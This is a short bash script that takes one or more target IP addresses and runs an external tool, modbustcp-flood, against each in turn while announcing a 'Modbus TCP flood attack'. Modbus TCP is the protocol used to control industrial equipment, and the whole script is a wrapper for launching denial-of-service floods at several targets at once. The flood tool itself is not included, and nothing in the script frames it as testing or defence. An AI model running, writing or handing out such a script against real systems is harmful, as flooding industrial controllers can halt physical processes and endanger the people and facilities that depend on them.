#!/bin/bash
if [ "$#" -lt 1 ]; then
   echo "Usage: $0 <target_ip1> <target_ip2> ... <target_ipN>"
   exit 1
fi

for TARGET_IP in "$@"; do
   echo "Starting Modbus TCP flood attack on $TARGET_IP"
   ./modbustcp-flood -a $TARGET_IP -t 10
done
